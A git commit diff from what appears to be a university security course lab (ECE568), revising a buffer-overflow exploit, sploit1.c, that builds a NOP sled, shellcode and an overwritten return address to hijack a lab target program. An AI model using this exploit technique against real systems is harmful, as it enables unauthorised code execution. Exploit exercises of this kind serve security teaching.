798c8862bf18e7659ec2714620c8008cff1f596a
Mahsa  Naserifar <naserifa@p105.ecf.utoronto.ca>
2020-01-31 18:31:07 -0500

    sploit 1 worksgit add sploit1.c!

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -9,7 +9,7 @@
 #define SHELL_SIZE 45
 #define BUF_TO_RET 120
 #define BUF_SIZE 125
-#define BUF_ADDR 0x2021feb0
+#define BUF_ADDR 0x2021fe10
 
 int
 main ( int argc, char * argv[] )
@@ -17,18 +17,15 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 	int i;
-	unsigned char attack_buffer[BUF_SIZE];
-	
-	for (i = 0; i < BUF_TO_RET - SHELL_SIZE; i++)
-		attack_buffer[i] = 0x90;
-	for (i = 0; i < SHELL_SIZE; i++)
-		attack_buffer[BUF_TO_RET - SHELL_SIZE + i] = shellcode[i];
-	
-	attack_buffer[BUF_TO_RET] = (char) ((BUF_ADDR & 0xFF000000) >> 24);
-	attack_buffer[BUF_TO_RET + 1] = (char) ((BUF_ADDR & 0x00FF0000) >> 16);
-	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR & 0x0000FF00) >> 8);
-	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0xFF);
-	attack_buffer[BUF_TO_RET + 4] = '\0';
+	char attack_buffer[BUF_SIZE];
+
+    strcpy(attack_buffer, "\x90");
+    for (i = 0; i < 70; i++)
+        strcat(attack_buffer, "\x90");
+
+    strcat(attack_buffer, shellcode);
+    for (i = 0; i < 2; i++)
+        strcat(attack_buffer, "\x10\xfe\x21\x20");
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
